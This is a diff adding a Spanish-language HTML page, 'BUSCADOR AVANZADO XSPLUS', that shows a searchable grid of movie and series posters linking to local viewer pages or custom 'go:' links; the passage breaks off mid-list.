@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html dir='ltr' lang='es' prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<!-- Basic data -->
+<meta charset='UTF-8'/>
+<meta content='article' property='og:type'/>
+<!-- Responsive viewport -->
+<meta content='width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0' name='viewport'/>
+<!-- Title -->
+<title>BUSCADOR AVANZADO XSPLUS</title>
+<style type='text/css'>
+*{margin:0;padding:0;box-sizing:border-box;list-style:none;}
+a{text-decoration:none;}
+body{background:#000;font-family:Nunito,sans-serif;}
+.cards{display:grid;grid-template-columns:1fr 1fr 1fr;}
+.card{text-align:center;}
+.card img{padding:1px;width:98%;height:98%;border-radius:7px;}
+.card span{padding:0 .3rem;display:none;}
+a{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;} 
+.form__group{position:relative;padding:15px 0 0;margin:0 auto;margin-top:10px;margin-bottom:1rem;width:90%;}
+.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1.3rem;color:#fff;padding:7px 0;background:0 0;transition:border-color .2s;}
+.form__field::placeholder{color:transparent;}
+.form__field:placeholder-shown~.form__label{font-size:1.3rem;cursor:text;top:20px;}
+.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:#fff;}
+.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,red,#008cf7,red);border-image-slice:1;}
+.form__field:focus~.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:red;font-weight:700;}
+.form__field:invalid,.form__field:required{box-shadow:none;}
+.listado{display:grid;grid-template-columns:repeat(1,1fr);}
+/*Fix: Unnecessary elements removed*/
+.widget-item-control,.item-control.blog-admin,
+.continue,.loadmore,.thread-chrome.thread-collapsed,
+.singleton-element:not(.cookie-choices-info),
+.noAllowNewComments .comment-reply,
+.comments .hidden {display:none;}
+/*Fix: Show lightbox*/
+.CSS_LIGHTBOX{z-index:90001!important;}
+/*Fix: Image responsive*/
+a[imageanchor]:not([style*=float]){margin-right:0!important;margin-left:0!important;}
+.widget-content img,
+img[data-original-height],
+img[data-original-width] {height: auto;}
+/*Fix: Comment Editor*/
+#comment-editor{border:0;width:100%;min-height:220px;}
+.box{margin:0 auto;margin-bottom:2rem;width:60%;display:flex;align-items:center;}
+#caps{font-size:1.3rem;}
+.progress{background:#212042;width:100%;height:15px;border-radius:10px;}
+.progress-bar{width:0;opacity:0;height:15px;background:linear-gradient(to right,#228ee9,#1b7dbf);border-radius:10px;display:flex;justify-content:center;align-items:center;transition:1s ease;}
+.box span{padding-left:10px;color:#fff;}
+.xaviec{background:#000;position:fixed;top:-5px;width:100%;}
+</style>
+<link href='https://fonts.googleapis.com/css2?family=Nunito&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Lato&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Montserrat&display=swap' rel='stylesheet'/>
+</head>
+<body>
+<!--LAS DEMÁS-->
+<div class="xaviec">
+<div class="form__group field">
+<input autocomplete="off" type="input" onkeyup="myFunction()" class="form__field" placeholder="Buscar" name="name" id="myInput" required />
+<label for="name" class="form__label">Buscar</label>
+</div></div></div><br><br><br><br>
+<center><ul class="cards" id="cards">
+
+    
+<li><a href="../View Peliculas/Sonic 3 La Peliculas (2025).html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/j1O319PWd4OdrpqPY4uzFNh2JC.jpg"/>
+<span>Sonic 3 La Pelicula Animacion 2024</span></a></li>
+
+<li><a href="../View Series/Dragon Ball Daima (2025).html" class="card">
+<img alt="imagen" src="../img poster/Serie/Dragon ball daima 2.png"/>
+<span>Dragon Ball Daima Serie Anime Animacion Serie 2024</span></a></li>
+
+<li><a href="../View Peliculas/Mufasa El rey león (2024).html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/j1O319PWd4OdrpqPY4uzFNh2JC.jpg"/>
+<span>Mufasa El rey león (2024) Animacion</span></a></li>
+
+<li><a href="../View Series/agatha quien sino.html" class="card">
+<img alt="imagen" src="../img poster/Serie/Agatha.jpg"/>
+<span>Agatha ¿Quien Si No? Heroes Marvel Brujas Serie 2024</span></a></li>
+
+<li><a href="../View Peliculas/Moana 2 (2024).html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/9yfI8gGG96Dgf9bf7VT3XCRX30T.jpg"/>
+<span>Moana 2 Animacion Comedia Familiar 2024</span></a></li>
+
+<li><a href="go:ThevenApo" class="card">
+<img alt="imagen" src="../img poster/Peliculas/los caballeros del apocalipsis los siete pecados capitales.jpg"/>
+<span>The Seven Deadly Sins: Los Cuatro Jinetes Del Apocalipsis Los Siete Pecados Capitales Serie Anime Animacion Serie 2024</span></a></li>
+
+<li><a href="../View Peliculas/Twisters (2024) .html" class="card">
+<img alt="imagen" src="../img poster/Peliculas/TWISTERS.jpg"/>
+<span>Twisters Natural Accion Aventura Suspenso 2024</span></a></li>
+
+<li><a href="go:ARescaBi" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Al rescate de fondo de bikini.jpg"/>
+<span>Al Rescate De Fondo De Bikini Animacion Comedia Aventura 2024</span></a></li>
+
+<li><a href="go:RCirculo" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Romper el circulo.jpg"/>
+<span>Romper El Circulo Romance Drama 2024</span></a></li>
+
+<li><a href="go:DMvagina" class="card">
+<img alt="imagen" src="../img poster/Peliculas/El diario de mi vagina.jpg"/>
+<span>Diario De Mi Vagina Comedia Drama 2024</span></a></li>
+
+<li><a href="go:LaJovenYm" class="card">
+<img alt="imagen" src="../img poster/Peliculas/La joven y el mar.jpg"/>
+<span>La Joven Y El Mar Drama 2024</span></a></li>
+
+<li><a href="../View Peliculas/Robot Salvaje (2024).html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/dE8Cwtnb31637ygPHTVDxFkg8K4.jpg"/>
+<span>Robot Salvaje animacion 2024</span></a></li>
+
+<li><a href="../View Peliculas/Deadpool y wolverine 2024.html" class="card">
+<img alt="imagen" src="../img poster/Peliculas/deadpool wolverine 2.jpg"/>
+<span>Deadpool Y Wolverine Accion Heroes Comedia 2024</span></a></li>
+
+<li><a href="go:ElArca24" class="card">
+<img alt="imagen" src="../img poster/Peliculas/el arca de noe.jpg"/>
+<span>El Arca De Noé Animacion 2024</span></a></li>
+
+<li><a href="go:ULadronR" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Un ladron romantico.jpg"/>
+<span>Un Ladron Romantico Romance Drama 2024</span></a></li>
+
+<li><a href="go:M.VGru4" class="card">
+<img alt="imagen" src="../img poster/Peliculas/mi villano 4.jpg"/>
+<span>Gru 4: Mi Villano Favorito 4 Animacion Mas Vistas 2024</span></a></li>
+
+<li><a href="go:frida24" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Frida 2024.jpg"/>
+<span>Frida Documental 2024</span></a></li>
+
+<li><a href="../View Peliculas/Intensamente 2.html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/hbNrgcQjLkPcE56MLGUWSD5SO6V.jpg"/>
+<span>Intensamente 2 Animacion 2024</span></a></li>
+
+<li><a href="go:ELPFDSena" class="card">
+<img alt="imagen" src="../img poster/Peliculas/En las profundidades del sena.jpg"/>
+<span>En las Profundidades De Seda Terror 2024</span></a></li>
+
+<li><a href="../View Peliculas/Un Lugar En Silencio Dia uno 3(2024).html" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Un lugar en silencio dia uno.jpg"/>
+<span>Un Lugar Silencio Dia 1  Un Lugar Silencioso Dia Uno Terror Suspenso Misterio 2024</span></a></li>
+
+<li><a href="go:MegaMen2" class="card">
+<img alt="imagen" src="../img poster/Peliculas/megamente 2.jpg"/>
+<span>Megamente 2 Contra El Sindicato Del Mal 2024</span></a></li>
+
+<li><a href="go:BabBoys4" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Bab boys hasta la muerte.jpg"/>
+<span>Bad Boys: Hasta La Muerte Accion 2024</span></a></li>
+
+<li><a href="go:Abigail" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Abigail.jpg"/>
+<span>Abigail Vampiro Terror 2024</span></a></li>
+
+<li><a href="go:EPDLS24" class="card">
+<img alt="imagen" src="../img poster/Peliculas/El Planeta de los Simios el reino.jpg"/>
+<span>El Planeta De Los Simios: Nuevo Reino Accion Aventura Ciencia Ficcion 2024</span></a></li>
+
+<li><a href="go:LECUno" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Los extraños capitulo 1.jpg"/>
+<span>Los Extraños: Capitulo 1 Terror 2024</span></a></li>
+
+<li><a href="go:Winnie2" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Winnie The pool miel y sangre 2.jpg"/>
+<span>Winnie de Pooh: Miel y Sangre 2 Terror Misterio Asesinato 2024</span></a></li>
+
+<li><a href="go:Detonante" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Detonante 2024.jpg"/>
+<span>Detonante Accion Armas 2024</span></a></li>
+
+<li><a href="go:Nahir" class="card">
+<img alt="imagen" src="../img poster/Peliculas/nahir.jpg"/>
+<span>Nahir Drama Crimen 2024</span></a></li>
+
+<li><a href="go:EliteSerie" class="card">
+<img alt="imagen" src="../img poster/Serie/Elite.jpg"/>
+<span>Elite Drama Misterio Crimen 2018 2024</span></a></li>
+
+<li><a href="../View Peliculas/Bob Esponja la marea desconocida 4 (2023).html" class="card">
+<img alt="imagen" src="https://peliculasbluray.com/wp-content/uploads/2023/09/5acad2256231c19958f612d842611bb05a610a0faa3e27f97f6ae18f6fbca04c._RI_TTW_-185x278.jpg"/>
+<span>BOB ESPONJA LA MANERA DESCONOCIDA Animacion Comedia 2023</span></a></li>
+
+<li><a href="go:NQV23" class="card">
+<img alt="imagen" src="../img poster/Peliculas/nada que ver.jpg"/>
+<span>Nada Que Ver Romance Comedia 2023</span></a></li>
+
+<li><a href="go:Mariobros" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Mario Bros.jpg"/>
+<span>Super Mario Bros Animacion 2023</span></a></li>
+
+<li><a href="go:Annanico" class="card">
+<img alt="imagen" src="../img poster/Peliculas/anna nicole.jpg"/>
+<span>Anna Nicole Smith: Tú No Me Conoces Documental 2023</span></a></li>
+
+<li><a href="go:SuUnicoHij" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Su unico hijo.jpg"/>
+<span>Su Unico Hijo Drama Biblico 2023</span></a></li>
+
+<li><a href="go:Leo23" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Leo animacion.jpg"/>
+<span>Leo Animacion Musical 2023</span></a></li>
+
+<li><a href="go:TuVida23" class="card">
+<img alt="imagen" src="../img poster/Peliculas/quiero tu vida.jpg"/>
+<span>Quiero Tu Vida Comedia 2023</span></a></li>
+
+<li><a href="go:Napoleon" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Napoleon.jpg"/>
+<span>Napoleon Drama Historico 2023</span></a></li>
+
+<li><a href="go:ExorCreyen" class="card">
+<img alt="imagen" src="../img poster/Peliculas/el exorcismo creyente.jpg"/>
+<span>El Exorcismo Creyente Terror Paranormal Suspenso Misterio 2023</span></a></li>
+
+<li><a href="go:LS2023" class="card">
+<img alt="imagen" src="../img poster/Peliculas/La Sirenita.jpg"/>
+<span>La Sirenita Animacion Musical Aventura 2023</span></a></li>
+
+<li><a href="go:BBeetle23" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Blue beetle.jpg"/>
+<span>Blue Beetle Accion Heroes 2023</span></a></li>
+
+<li><a href="go:LaMonja2" class="card">
+<img alt="imagen" src="../img poster/Peliculas/La Monja 2.jpg"/>
+<span>La Monja 2 Terror Paranormal Misterio 2023</span></a></li>
+
+<li><a href="go:Spider23" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Spiderman a traves del spider-verse.jpg"/>
+<span>Spider-Man A Travez Del SpiderVerso Spider-Man: Cruzando el Multiverso Animacion 2023</span></a></li>
+
+<li><a href="go:WishP23" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Wiss el poder de los deseos.jpg"/>
+<span>Wish: El Poder De Los Deseos Animacion Musical Magia 2023</span></a></li>
+
+<li><a href="go:Wonka" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Wonka.jpg"/>
+<span>Wonka Musical Animacion 2023</span></a></li>
+
+<li><a href="go:CuidenMaya" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/rfI5sTEgJ1ozPMnA3BhZDvxnmAD.jpg"/>
+<span>Cuiden A Maya Documental Crimen 2023</span></a></li>
+
+<li><a href="go:El rencor2" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Los Siete pecados capitales el rencor de edimburgo 2.jpg"/>
+<span>Los Siete Pecados Capitales: El Rencor De Edimburgo - Parte 2 Anime Peliculas Animacion 2023</span></a></li>
+
+<li><a href="go:365Di3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/mwcII5bXMeMTKyCejPuBPBTjmxu.jpg"/>
+<span>365 Días Mas Romance Drama 2022</span></a></li>
+
+<li><a href="go:365Di2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/jBpqADo9XAKaecvI3f0J4hRAEyO.jpg"/>
+<span>365 Dias 2: Aquel Dia Romance Drama 2022</span></a></li>
+
+<li><a href="go:DoctorS22" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/vThe85YlGE5r7fqEVFePETqnWzk.jpg"/>
+<span>Doctor Strange: En El Multiverso De La Locura Accion Heroes Marvel 2022</span></a></li>
+
+<li><a href="go:DobleEm22" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/mNkAOFyb4TV2gTSc92jx2O9evtj.jpg"/>
+<span>Doblemente Embarazada 2 Comedia (2022) 2022</span></a></li>
+
+<li><a href="go:LuckSuerte" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/bwlHp4KsAyuEIAtbYs4mxCkrgyx.jpg"/>
+<span>Luck: Suerte Animacion Musical 2022</span></a></li>
+
+<li><a href="go:B.Panther2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/3nRpczJi9l1zfc726hzxoD55mKS.jpg"/>
+<span>Pantera Negra: Wakanda Forever Black Panther: Wakanda Forever Accion Heroes Marvel 2022</span></a></li>
+
+<li><a href="go:DbSSH22" class="card">
+<img alt="imagen" src="https://i.ebayimg.com/images/g/GJMAAOSwA2pjJnBB/s-l1200.png"/>
+<span>Dragon Ball Super: Super Hero Anime Pelicula Animacion 2022</span></a></li>
+
+<li><a href="go:Thor4Amor" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/pASJkJfb5tPXn3AW2aAFLMn6Afu.jpg"/>
+<span>Thor: Amor Y Trueno Accion Marvel Heroes 2022</span></a></li>
+
+<li><a href="../View Peliculas/Sonic 2 La Pelicula (2022).html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/l0iTNJutdtP5cMjEuurPOiSonNl.jpg"/>
+<span>Sonic 2 La Pelicula Animacion 2022</span></a></li>
+
+<li><a href="go:ViudaNegra" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/tvl0OXmNQtLrPk7fJ8UHvLrD37R.jpg"/>
+<span>Viuda Negra Black Widow Accion Heroes Marvel 2021</span></a></li>
+
+<li><a href="go:Genesis" class="card">
+<img alt="imagen" src="https://www.lavanguardia.com/peliculas-series/images/serie/poster/2021/1/w1280/8hUZa9LzC4vyQiwX8KadKLIBXWg.jpg"/>
+<span>Genesis Drama Biblico Telenovelas 2021</span></a></li>
+
+<li><a href="go:SSinCasa3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/rkLhaNa37IwzWis8rzWMAYTCdIK.jpg"/>
+<span>Spider-Man: Sin Camino A Casa Accion Heroes Marvel 2021</span></a></li>
+
+<li><a href="go:Eva" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/w500/bXZ3j3kQgCRZj7KD4Q5F9m5ABaQ.jpg"/>
+<span>Eva Drama Romance 2021</span></a></li>
+
+<li><a href="go:UnJefe2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/w500/kv2Qk9MKFFQo4WQPaYta599HkJP.jpg"/>
+<span>Un Jefe En Pañales 2: Negocios De Familia Animacion Musical 2021</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://www.themoviedb.org/t/p/original/iF8ai2QLNiHV4anwY1TuSGZXqfN.jpg"/>
+<span>Chucky Terror Asesinato Serie 2021</span></a></li>
+
+<li><a href="go:Uncharted" class="card">
+<img alt="imagen" src="https://e1.pxfuel.com/desktop-wallpaper/611/257/desktop-wallpaper-uncharted-movie-poster-on-behance-uncharted-movie.jpg"/>
+<span>Uncharted: Fuera Del Mapa Accion 2021</span></a></li>
+
+<li><a href="go:BrujaYVisi" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/cx8rEVxKFkQ1wz9OnN5mJzdwZOl.jpg"/>
+<span>La Bruja Escarlata y Visión Accion Heroes Serie 2021</span></a></li>
+
+<li><a href="go:Venom2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/kviQ0gYXjBug7JEYteV8IbZzE3l.jpg"/>
+<span>Venom 2: habrá matanza Accion Marvel Heroes 2021</span></a></li>
+
+<li><a href="go:Encanto" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/ybXzCBc9x9bcM1ukmwhErutRiLO.jpg"/>
+<span>Encanto Animacion Musical 2021</span></a></li>
+
+<li><a href="go:CarmenFari" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/reCITeX2dHESCEiziZyaCj5sjj1.jpg"/>
+<span>El Exorcismo De Carmen Farias Terror Paranormal 2021</span></a></li>
+
+<li><a href="go:El Es Asi" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/gTboh2Tf7zKlXWJk4UdOL1G8ki7.jpg"/>
+<span>El Es Asi Romance Drama 2021</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/tMaldDd5A6g2B7pZuHwCbcKCYsC.jpg"/>
+<span>Ojo De Halcon Accion Heroes Marvel 2021</span></a></li>
+
+<li><a href="go:Conjuro3D" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/79QjdRiT9zTLkrOq9FltoIxClma.jpg"/>
+<span>El Conjuro 3 Expediente Warren: Obligado Por El Demonio Terror Misterio Suspenso 2021 </span></a></li>
+
+<li><a href="go:365Di1" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/jz8T3hrU6GuMqSuQ4Rbd4MJUeaq.jpg"/>
+<span>365 Dias Romance Drama 2020</span></a></li>
+
+<li><a href="go:BadBoys3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/5XR7Pbo8qdwdpOIsFtWJOEiOJD6.jpg"/>
+<span>Bad Boys 3: Para Siempre Accion Comedia 2020</span></a></li>
+
+<li><a href="../View Peliculas/Sonic 1 La Pelicula (2020).html" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/5XR7Pbo8qdwdpOIsFtWJOEiOJD6.jpg"/>
+<span>Sonic La Pelicula Animacion 2020</span></a></li>
+
+<li><a href="go:Annabelle3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/3ZZB2UHGK2iqj4XYgmivkeCgGJn.jpg"/>
+<span>Annabelle: Vuelve A Casa Terror Paranormal Suspenso 2019</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://www.themoviedb.org/t/p/original/wKA1bGGc2mDFyZVZlqPx7LFJnat.jpg"/>
+<span>El juego del calamar</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/iVa7A7priXkDMspXAIFVsHbL016.jpg"/>
+<span>Steven Universe Future: La Pelicula Animacion Anime Pelicula 2019 </span></a></li>
+
+<li><a href="go:L:VInfinit" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/1ELa9bm6zxIADz8u71VZtvNzx3k.jpg"/>
+<span>Los Vengadores: Endgame The Avengers: Endgame Accion Heroes Marvel 2019</span></a></li>
+
+<li><a href="go:It(Eso)2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/pxw6j2AwlUsw5iS4fCxPoCP0jPh.jpg"/>
+<span>It Capitulo 2 (Eso) Terror - Misterio - Suspenso 2019</span></a></li>
+
+<li><a href="go:SLejos2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/5G3TZqMRqWrcIiDy2OvITmQzU11.jpg"/>
+<span>Spider-Man: Lejos De Casa Accion Heroes Marvel 2019</span></a></li>
+
+<li><a href="go:L:VInfinit" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/z58HrY2Hd9PlSpBTsZuoavfDavd.jpg"/>
+<span>Los Vengadores: Infinity War The Avengers: Infinity War Accion Heroes Marvel 2018</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/9dkO9nB20g3lkiWgxj7jxg3QDFk.jpg"/>
+<span>Jesus Drama Biblico Telenovela 2018</span></a></li>
+
+<li><a href="go:DbsBroly" class="card">
+<img alt="imagen" src="https://i.ebayimg.com/images/g/578AAOSw-4Jb-2GV/s-l1600.jpg"/>
+<span>Dragon Ball Super Broly Anime Pelicula Animacion 2018</span></a></li>
+
+<li><a href="go:LosIncrei2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/7uintpyNlSF32hj5Bua85VuAp2R.jpg"/>
+<span>Los Increible 2 Animacion 2018</span></a></li>
+
+<li><a href="go:Annabelle2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/qIPmOu09U3KrUTMncw8A52ilgDT.jpg"/>
+<span>Annabelle: La Creacion Terror Paranormal Suspenso 2017</span></a></li>
+
+<li><a href="go:It(Eso)1" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/p77sfJRQyqxvTDy6ulGLnw0uAhh.jpg"/>
+<span>It Capitulo 1 (Eso) Terror - Misterio - Suspenso 2017</span></a></li>
+
+<li><a href="go:SRegreso1" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/81qIJbnS2L0rUAAB55G8CZODpS5.jpg"/>
+<span>Spider-Man: Regreso A Casa Accion Heroes Marvel 2017</span></a></li>
+
+<li><a href="go:ElConjuro2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/x4jUJ0fF60SSOeUUTkaRtmnDvwG.jpg"/>
+<span>El Conjuro 2: El Caso Enfiend 2016</span></a></li>
+
+<li><a href="go:DStrange1" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/zdZ2ZykDKGkUuGgOszqrt1fn3cx.jpg"/>
+<span>Doctor Strange Accion Heroes Marvel 2016</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/kGeAQ36ePIPYOJxWjwpo0ioA1NJ.jpg"/>
+<span>Josue Y La Tierra Prometida Drama Telenovela Biblico 2016</span></a></li>
+
+<li><a href="go:Borutomovi" class="card">
+<img alt="imagen" src="https://pbs.twimg.com/media/DQu5y8rVQAcA9Ul.jpg"/>
+<span>Boruto: La Pelicula Anime Pelicula Animacion 2015</span></a></li>
+
+<li><a href="go:AnnaCadav" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/hJaC0mBzPQxlm6ZngJAhgytEtHj.jpg"/>
+<span>El Cadaver De Anna Fritz Terror Suspenso 2015</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/hasMQTJXgv20EyNUDcNKMhQW6gq.jpg"/>
+<span>Dragon Ball Z: La resurrección de Freezer Anime Pelicula Animacion 2015</span></a></li>
+
+<li><a href="go:Moises" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/spMIIipBp3sz24zIG1oXgGFfcNZ.jpg"/>
+<span>Moises Y Los Diez Mandamientos Drama Biblico Telenovela 2015</span></a></li>
+
+<li><a href="go:DulceVeng3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/aH3TbHO71FkUSXVKDbpPaoFtgG3.jpg"/>
+<span>Dulce Venganza 3 Terror Asesinato Crimen Suspenso 2015</span></a></li>
+
+<li><a href="go:VengUltron" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/71wSx6MQm8EbMNDi3vVaD8nD9SL.jpg"/>
+<span>Los Vengadores: La Era De Ultron Accion Heroes Marvel 2015</span></a></li>
+
+<li><a href="go:Annabelle1" class="card">
+<img alt="imagen" src="https://xl.movieposterdb.com/21_07/2014/3322940/xl_3322940_29a35439.jpg"/>
+<span>Annabelle Terror Paranormal Suspenso 2014</span></a></li>
+
+<li><a href="go:Rec4" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/w500/sD6LX35RwyDzMDAunn89MBZFnFv.jpg"/>
+<span>[REC]⁴: Apocalipsis Terror Zombies Misterio Suspenso 2014</span></a></li>
+
+<li><a href="go:HDD2014" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/pnORCAOUW0JKR84ueMap8GiBAoA.jpg"/>
+<span>Hijo De Dios Biblico 2014</span></a></li>
+
+<li><a href="go:SansonYDal" class="card">
+<img alt="imagen" src="https://www.themoviedb.org/t/p/w600_and_h900_bestv2/3bdxncan9iyCtQkgy1NwILR6h9A.jpg"/>
+<span>Sanson Y Dalila Drama Biblico Telenovela 2013</span></a></li>
+
+<li><a href="go:Frozen" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/sGNuWC4BwqOB4l0tkbKwLy70tXC.jpg"/>
+<span>Frozen Animacion Musical 2013 Aventura</span></a></li>
+
+<li><a href="go:ElConjuro1" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/2HDcIJzvZwENwQHMnmz0zgD74fS.jpg"/>
+<span>El Conjuro Terror Suspenso Paranormal 2013</span></a></li>
+
+<li><a href="go:DulceVeng2" class="card">
+<img alt="imagen" src="https://play-lh.googleusercontent.com/we-fMQcJnu25SvIuU3R34b9buhdeDFJxUaBY3QRAeT2CpOSFkUZwKG44H5USkok1PMQ"/>
+<span>Dulce Venganza 2 Terror Violacion Crimen Suspenso 2013</span></a></li>
+
+<li><a href="go:DbzBTDLD" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/cIyPFIeSKNTiWU9Zny0c0IVPQRY.jpg"/>
+<span>Dragon Ball Z: La Batalla De Los Dioses Anime Pelicula Animacion 2013</span></a></li>
+
+<li><a href="go:Josegip" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/diXtQic9EzM3HRpvA0PfL32kkJ0.jpg"/>
+<span>Jose De Egipto Drama Telenovela Biblico 2013</span></a></li>
+
+<li><a href="go:Qpasoay3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/1goOfrB3ZRnoJenHHIDqiskMi9q.jpg"/>
+<span>¿Que Paso Ayer? 3 Comedia 2013</span></a></li>
+
+<li><a href="go:Metegol13" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/dXWCHlDvkth40JhX2ctSdK5DC9d.jpg"/>
+<span>Metegol Animacion Comedia 2013</span></a></li>
+
+<li><a href="go:Avenida" class="card">
+<img alt="imagen" src="https://i.pinimg.com/736x/dd/be/d8/ddbed8487be82a20832f383765a288df.jpg"/>
+<span>Avenida Brasil Drama Crimen Robo Telenovelas 2012</span></a></li>
+
+<li><a href="go:Rec3" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/cRVSZ03HIXKOKfRaKd00gZC5uqA.jpg"/>
+<span>[REC]³: Génesis Terror Zombies Misterio Suspenso 2012</span></a></li>
+
+<li><a href="go:Qpasoay2" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/dzaVnS19yDTkkGZRlf89sND75i7.jpg"/>
+<span>¿Que Paso Ayer? 2 Comedia 2011</span></a></li>
+
+<li><a href="go:Dragon" class="card">
+<img alt="imagen" src="https://i.ebayimg.com/images/g/XigAAOSwNMVaUS0b/s-l1200.jpg"/>
+<span>Dragon Ball Z Anime Serie 1989</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://i.pinimg.com/564x/14/4c/c4/144cc486f2430a8ddec0a9f1101f3d20.jpg"/>
+<span>Dragon Ball Z: El Poder invencible Anime Pelicula Animacion</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/daKUEF0jEFJv0CXes48LpaDg3o8.jpg"/>
+<span>Dragon Ball Z: El Regreso De Broly Anime Pelicula Animacion </span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="https://image.tmdb.org/t/p/original/96IrRfvolvjoTey4M12UNvtJ1hq.jpg"/>
+<span>Dragon Ball Z: Combate Final Anime Pelicula Animacion</span></a></li>
+
+<li><a href="go:Aladdin" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Aladdin.jpg"/>
+<span>Aladdin Animacion Musical 1993</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Dragon ball z la galaxia corre peligro.jpg"/>
+<span>Dragon Ball Z: La Galaxia Corre Peligro Anime Pelicula Animacion</span></a></li>
+
+<li><a href="#" class="card">
+<img alt="imagen" src="../img poster/Peliculas/Dragon ball el ataque del dragon.jpg"/>
